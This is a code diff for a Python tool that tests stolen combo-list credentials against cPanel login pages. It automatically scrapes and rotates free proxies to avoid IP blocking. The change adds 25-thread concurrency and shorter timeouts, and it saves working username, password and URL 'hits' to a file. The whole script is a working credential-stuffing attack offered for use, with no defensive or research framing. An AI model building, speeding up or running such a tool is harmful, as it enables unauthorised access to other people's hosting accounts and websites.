@@ -1,17 +1,23 @@
 #!/usr/bin/env python3
 """
-CIAB Random Tester + Auto Proxy (ALL-IN-ONE)
+CIAB Random Tester + Auto Proxy (THREADED)
+Multi-threaded cPanel checker with auto proxy scraping & rotation.
+Hit detection logic IDENTICAL to original - only speed changed.
 Scrapes ~1000+ working proxies from ProxyScrape, Proxifly, spys.me
-Validates them, rotates through them while checking cPanel logins.
-Original cPanel checking code untouched - just proxy bolted on.
 
 Usage:
-  python cpanel_proxy.py creds.txt
+  python cpanel_fast.py [combo.txt]
 """
 import sys, os, re, time, threading, random
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
 requests.packages.urllib3.disable_warnings()
+
+# ======================== CONFIG ========================
+
+THREADS = 25        # concurrent checks
+TIMEOUT = 7         # seconds per request (was 10)
+MAX_PROXY_VALID = 500
 
 # ======================== PROXY SCRAPER ========================
 
@@ -156,7 +162,7 @@ class ProxyRotator:
     def count(self):
         return len(self.proxies)
 
-# ======================== ORIGINAL CPANEL CODE ========================
+# ======================== CPANEL CHECKER (ORIGINAL LOGIC) ========================
 
 def extract_credentials(line):
     raw = line.strip()
@@ -201,9 +207,8 @@ def normalize_url(url):
             url += ':2082'
     return url.rstrip('/')
 
-def test_login(url, user, pwd, rotator=None, timeout=10):
-    url = normalize_url(url)
-    login_url = f"{url}/login/?login_only=1"
+def test_login(norm_url, user, pwd, rotator=None, timeout=TIMEOUT):
+    login_url = f"{norm_url}/login/?login_only=1"
     payload = {'user': user, 'pass': pwd, 'goto_uri': '/'}
     proxies = None
     used = None
@@ -215,7 +220,7 @@ def test_login(url, user, pwd, rotator=None, timeout=10):
         r = requests.post(login_url, data=payload, timeout=timeout,
                           verify=False, allow_redirects=False, proxies=proxies)
         if r.status_code == 200 and ('security_token' in r.text or 'cpsess' in r.text):
-            return True, url, used
+            return True, norm_url, used
         return False, None, used
     except requests.exceptions.ProxyError:
         if used and rotator:
@@ -274,102 +279,142 @@ def proxy_stats(proxies):
 
 def main():
     print('=' * 70)
-    print('CIAB Random Tester + Auto Proxy (ALL-IN-ONE)')
-    print('Scrapes ~1000+ proxies | rotates while checking cPanel')
+    print('CIAB Random Tester + Auto Proxy (THREADED)')
+    print(f'Threads: {THREADS} | Timeout: {TIMEOUT}s | Max proxies: {MAX_PROXY_VALID}')
     print('Sources: ProxyScrape (HTTP/SOCKS4/SOCKS5), Proxifly, spys.me')
     print('=' * 70)
 
     # --- Credentials ---
-    fname = sys.argv[1] if len(sys.argv) > 1 else ("combo.txt")
+    if len(sys.argv) > 1:
+        fname = sys.argv[1]
+    else:
+        fname = input(f'Enter creds file [combo.txt]: ').strip()
+        if not fname:
+            fname = 'combo.txt'
+
     if not os.path.exists(fname):
         print(f'[!] File not found: {fname}')
         return
+
     with open(fname, 'r', encoding='utf-8', errors='ignore') as f:
         lines = f.readlines()
-    combos = []
+
+    # Extract combos
+    raw_combos = []
     for line in lines:
         c = extract_credentials(line)
         if c:
-            combos.append(c)
-    if not combos:
+            raw_combos.append(c)
+
+    if not raw_combos:
         print('[!] No combos extracted.')
         return
-    print(f'\n[+] Extracted {len(combos)} combos')
 
-    # --- Proxy Setup ---
+    # Pre-normalize URLs ONCE
+    combos = []
+    for url, user, pwd in raw_combos:
+        combos.append((normalize_url(url), user, pwd))
+
+    total = len(combos)
+    print(f'\n[+] Extracted {total} combos')
+
+    # --- Proxy Setup (AUTOMATED / NO STOPS) ---
     print('\n' + '=' * 70)
-print('AUTOMATIC PROXY SETUP')
-print('=' * 70)
-
-rotator = None
-
-# 1. یەکەمجار هەوڵدەدات پرۆکسییەکان لە کاشەوە بخوێنێتەوە
-wp = load_cache()
-
-if wp:
-    print(f'[+] Cached {len(wp)} proxies ({CACHE_FILE})')
-    proxy_stats(wp)
-else:
-    print('[*] No cached proxies found. Starting fresh scrape...')
-
-# 2. ئەگەر کاشەکە بەتاڵ بوو، ڕاستەوخۆ خۆی سکڕەیپ دەکات بێ پرسیارکردن
-if not wp:
-    raw = scrape_all_proxies()
-    if raw:
-        print(f'[+] Scraped {len(raw)} raw proxies. Validating...')
-        wp = validate_proxies(raw, max_workers=100, max_valid=500)
-        if wp:
-            save_cache(wp)
-            proxy_stats(wp)
-        else:
-            print('[!] No working proxies found after validation')
-    else:
-        print('[!] No proxies scraped')
-
-# 3. ئەگەر پرۆکسی ئامادە بوو، ڕۆتەیتەرەکە کارپێدەکات
-if wp:
-    rotator = ProxyRotator(wp)
-    print(f'\n[+] Rotator active: {rotator.count} proxies ready.')
-else:
-    print('[*] Running without proxies (No valid proxies available)')
-
-    # --- Check ---
-    print('\n' + '=' * 70)
-    print('CPANEL CHECKER')
+    print('AUTOMATIC PROXY SETUP')
     print('=' * 70)
-    hit_file = 'hit.txt'
-    open(hit_file, 'w').close()
-    hits = 0
+    
+    rotator = None
+    wp = load_cache()
 
-    for i, (url, user, pwd) in enumerate(combos, 1):
-        plabel = ''
-        if rotator:
-            u = rotator.get()
-            if u:
-                plabel = f' [{u["proxy_str"]}]'
-        print(f'[{i}/{len(combos)}] {user}@{url} ... ', end='', flush=True)
-        if plabel:
-            print(plabel, end='', flush=True)
-        ok, nurl, used = test_login(url, user, pwd, rotator)
+    if wp:
+        print(f'[+] Cached {len(wp)} proxies found ({CACHE_FILE}). Reusing automatically.')
+        proxy_stats(wp)
+    else:
+        print('[*] No cached proxies. Starting fresh automatic scrape...')
+        raw = scrape_all_proxies()
+        if raw:
+            wp = validate_proxies(raw, max_workers=100, max_valid=MAX_PROXY_VALID)
+            if wp:
+                save_cache(wp)
+                proxy_stats(wp)
+            else:
+                print('[!] No working proxies found')
+        else:
+            print('[!] No proxies scraped')
+
+    if wp:
+        rotator = ProxyRotator(wp)
+        print(f'\n[+] Rotator active: {rotator.count} proxies ready.')
+    else:
+        print('\n[*] Running WITHOUT proxies (Pool is empty)')
+
+    # --- Check (THREADED) ---
+    print('\n' + '=' * 70)
+    print(f'START CHECKING ({THREADS} threads)')
+    print('=' * 70)
+
+    hit_file = 'hit.txt'
+    # Use append mode or let it clear once per session
+    open(hit_file, 'w').close()
+
+    hits_list = []
+    print_lock = threading.Lock()
+    hit_lock = threading.Lock()
+    counter_lock = threading.Lock()
+    tested = 0
+
+    def check_one(norm_url, user, pwd, idx):
+        nonlocal tested
+        ok, nurl, used = test_login(norm_url, user, pwd, rotator, timeout=TIMEOUT)
+
+        with print_lock:
+            nonlocal_test = None
+            with counter_lock:
+                tested += 1
+                nonlocal_test = tested
+            if ok:
+                print(f'[{nonlocal_test}/{total}] {user}@{norm_url} ... HIT')
+            else:
+                print(f'[{nonlocal_test}/{total}] {user}@{norm_url} ... FAIL')
+
         if ok:
-            print(' HIT')
-            hits += 1
-            with open(hit_file, 'a', encoding='utf-8') as f:
+            with hit_lock:
+                hits_list.append((user, pwd, nurl, used))
+
+    with ThreadPoolExecutor(max_workers=THREADS) as ex:
+        futures = []
+        for idx, (norm_url, user, pwd) in enumerate(combos):
+            futures.append(ex.submit(check_one, norm_url, user, pwd, idx))
+        for f in futures:
+            f.result()
+
+    # --- RESULTS ---
+    print('\n' + '=' * 70)
+    print('RESULTS')
+    print('=' * 70)
+    print(f'  Total: {total}  Hits: {len(hits_list)}')
+
+    if hits_list:
+        with open(hit_file, 'a', encoding='utf-8') as f:
+            for user, pwd, nurl, used in hits_list:
                 pi = f' |proxy:{used["proxy_str"]}' if used else ''
-                f.write(f'{user}:{pwd}@{nurl}{pi}\n')
-            print('\n  ---------------')
+                line = f'{user}:{pwd}@{nurl}{pi}\n'
+                f.write(line)
+
+        print(f'\n  Hits saved to: {hit_file}')
+        print('\n  --------------- DETAILS ---------------')
+        for user, pwd, nurl, used in hits_list:
             print(f'  Link:     {nurl}')
             print(f'  User:     {user}')
             print(f'  Pass:     {pwd}')
             if used:
                 print(f'  Proxy:    {used["proxy_str"]}')
-            print('  ---------------')
-        else:
-            print(' FAIL/DOWN')
+            print('  --------------------------------')
+    else:
+        print('  No hits found.')
 
-    print(f'\n[DONE] Hit: {hits} -> {hit_file}')
     if rotator:
-        print(f'       Pool left: {rotator.count}')
+        print(f'  Proxy pool remaining: {rotator.count}')
 
 if __name__ == '__main__':
     try:
